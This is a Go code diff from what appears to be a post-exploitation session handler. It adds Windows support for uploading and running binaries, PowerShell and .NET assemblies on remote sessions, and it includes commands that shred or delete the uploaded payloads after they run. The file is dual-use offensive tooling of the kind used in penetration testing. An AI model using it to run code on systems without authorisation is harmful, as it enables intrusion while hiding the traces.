@@ -87,6 +87,13 @@ func findNewestWorkerSession(sessions map[string]*SessionInfo) *SessionInfo {
 	return newest
 }
 
+func resolveWorkerPlatform(workerPlatform, parentPlatform string) string {
+	if workerPlatform == "detecting..." || workerPlatform == "unknown" || workerPlatform == "" {
+		return parentPlatform
+	}
+	return workerPlatform
+}
+
 func shouldUseWorkerForSpawn(platform string) bool {
 	return platform == "windows"
 }
@@ -100,6 +107,12 @@ func (s *SessionInfo) Directory() string {
 
 	home, _ := os.UserHomeDir()
 	return filepath.Join(home, ".gummy", "sessions", dirname)
+}
+
+func (s *SessionInfo) newTransferer() *Transferer {
+	t := NewTransferer(s.Conn, s.ID)
+	t.SetPlatform(s.Platform)
+	return t
 }
 
 // ScriptsDir retorna o diretório de scripts e cria se não existir
@@ -200,8 +213,12 @@ func (s *SessionInfo) getOutputPath(scriptPath string) string {
 // scriptSource: URL or local path to script file
 // args: arguments to pass to the script
 func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string, args []string) error {
+	if s.Platform == "windows" {
+		return fmt.Errorf("run sh is not supported on Windows; use run ps1 or run dotnet")
+	}
+
 	// Resolve source: download URL to local, check binbag, etc.
-	t := NewTransferer(s.Conn, s.ID)
+	t := s.newTransferer()
 	localPath, cleanup, err := t.resolveSource(scriptSource)
 	if err != nil {
 		// Fallback: try direct download to session cache
@@ -278,8 +295,13 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 // Same as RunScriptInMemory but for binary executables (disk + cleanup)
 // BLOCKING — caller should run in goroutine (StartModule does this)
 func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args []string) error {
+	if s.Platform == "windows" {
+		return fmt.Errorf("run elf is not supported on Windows yet; use run dotnet or run ps1 for now")
+	}
+
 	// Resolve source: download URL to local, check binbag, etc.
-	t := NewTransferer(s.Conn, s.ID)
+	t := s.newTransferer()
+	t.progressFn = func(string) {}
 	localPath, cleanup, err := t.resolveSource(binarySource)
 	if err != nil {
 		// Fallback: try direct download to session cache
@@ -308,15 +330,9 @@ func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args [
 	}
 
 	// Upload binary using SmartUpload (HTTP if binbag enabled, b64 fallback)
-	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
+	remotePath := buildRemoteBinaryPath(s.Platform, localPath, time.Now().UnixNano())
 	if err := t.SmartUpload(context.Background(), localPath, remotePath); err != nil {
 		return fmt.Errorf("upload failed: %w", err)
-	}
-
-	// Build args
-	argsStr := ""
-	if len(args) > 0 {
-		argsStr = " " + strings.Join(args, " ")
 	}
 
 	// Open terminal window with tail -f of local output file
@@ -326,12 +342,54 @@ func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args [
 
 	// Execute: trap ensures cleanup on ANY exit (natural, SIGHUP from conn close, SIGINT, SIGTERM)
 	// This is critical for long-running binaries like pspy that never exit on their own
-	remoteCmd := fmt.Sprintf("trap 'shred -uz %s 2>/dev/null || rm -f %s' EXIT; chmod +x %s && %s%s",
-		remotePath, remotePath, remotePath, remotePath, argsStr)
+	remoteCmd := buildUnixBinaryCommand(remotePath, args)
 
 	// Execute the command — BLOCKING (caller should run in goroutine)
 	err = s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
 	return err
+}
+
+func buildRemoteBinaryPath(platform, localPath string, unixNano int64) string {
+	filename := filepath.Base(localPath)
+	if platform == "windows" {
+		return fmt.Sprintf(`C:\Windows\Temp\gummy_%d_%s`, unixNano, filename)
+	}
+	return fmt.Sprintf("/tmp/.gummy_%d_%s", unixNano, filename)
+}
+
+func windowsNativeArgsLiteral(args []string) string {
+	if len(args) == 0 {
+		return ""
+	}
+	quoted := make([]string, len(args))
+	for i, arg := range args {
+		escaped := strings.ReplaceAll(arg, `"`, `""`)
+		quoted[i] = fmt.Sprintf(`"%s"`, escaped)
+	}
+	return " " + strings.Join(quoted, " ")
+}
+
+func buildWindowsBinaryCommand(remotePath string, args []string) string {
+	outputPath := remotePath + ".out.txt"
+	return fmt.Sprintf(`try {
+    $gummyOut = '%s'
+    & '%s'%s *> $gummyOut
+    if (Test-Path $gummyOut) {
+        Get-Content $gummyOut -Raw
+    }
+} finally {
+    Remove-Item $gummyOut -Force -ErrorAction SilentlyContinue
+    Remove-Item '%s' -Force -ErrorAction SilentlyContinue
+}`, outputPath, remotePath, windowsNativeArgsLiteral(args), remotePath)
+}
+
+func buildUnixBinaryCommand(remotePath string, args []string) string {
+	argsStr := ""
+	if len(args) > 0 {
+		argsStr = " " + strings.Join(args, " ")
+	}
+	return fmt.Sprintf("trap 'shred -uz %s 2>/dev/null || rm -f %s' EXIT; chmod +x %s && %s%s",
+		remotePath, remotePath, remotePath, remotePath, argsStr)
 }
 
 func powershellArgLiteral(args []string) string {
@@ -416,9 +474,12 @@ func buildWindowsDotNetB64Command(varName string, args []string) string {
 // RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
 // Similar to RunScriptInMemory but for PowerShell on Windows
 func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource string, args []string) error {
+	if s.Platform != "windows" {
+		return fmt.Errorf("run ps1 is only supported on Windows")
+	}
+
 	// Resolve source
-	t := NewTransferer(s.Conn, s.ID)
-	t.SetPlatform(s.Platform)
+	t := s.newTransferer()
 	localPath, cleanup, err := t.resolveSource(scriptSource)
 	if err != nil {
 		if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
@@ -485,9 +546,12 @@ func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource st
 // RunDotNetInMemory executes .NET assemblies in-memory (Windows, zero disk writes)
 // Uses reflection to load and execute assembly from memory
 func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource string, args []string) error {
+	if s.Platform != "windows" {
+		return fmt.Errorf("run dotnet is only supported on Windows")
+	}
+
 	// Resolve source
-	t := NewTransferer(s.Conn, s.ID)
-	t.SetPlatform(s.Platform)
+	t := s.newTransferer()
 	localPath, cleanup, err := t.resolveSource(assemblySource)
 	if err != nil {
 		if strings.HasPrefix(assemblySource, "http://") || strings.HasPrefix(assemblySource, "https://") {
@@ -588,8 +652,7 @@ func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string
 	}
 
 	// Resolve source
-	t := NewTransferer(s.Conn, s.ID)
-	t.SetPlatform(s.Platform)
+	t := s.newTransferer()
 	localPath, cleanup, err := t.resolveSource(scriptSource)
 	if err != nil {
 		if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
@@ -747,10 +810,10 @@ func (c *GummyCompleter) Do(line []rune, pos int) (newLine [][]rune, length int)
 			}
 			return c.completeFromList(currentArg, names)
 		} else if argCount == 2 {
-			// For custom modules (sh, bin, ps1, dotnet, py), complete local paths + binbag files
+			// For custom modules (sh, elf, ps1, dotnet, py), complete local paths + binbag files
 			if len(parts) >= 2 {
 				switch parts[1] {
-				case "sh", "bin", "ps1", "dotnet", "py":
+				case "sh", "elf", "ps1", "dotnet", "py":
 					localMatches, localLen := c.completeLocalPath(currentArg)
 					if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled &&
 						!strings.ContainsAny(currentArg, "/\\") {
@@ -1714,6 +1777,7 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 			}
 			time.Sleep(500 * time.Millisecond)
 		}
+		workerSession.Platform = resolveWorkerPlatform(workerSession.Platform, session.Platform)
 
 		// Stop spinner — module is launching, user can continue working
 		m.stopSpinner(spinID)
@@ -2414,7 +2478,7 @@ func (m *Manager) showHelp() {
 	// Modules category
 	lines = append(lines, ui.CommandHelp("modules"))
 	lines = append(lines, ui.Command("modules                      - List available modules"))
-	lines = append(lines, ui.Command("run <module> [args]          - Run a module (e.g., run peas, run lse, run bin)"))
+	lines = append(lines, ui.Command("run <module> [args]          - Run a module (e.g., run peas, run lse, run elf)"))
 	lines = append(lines, "")
 
 	// Binbag category
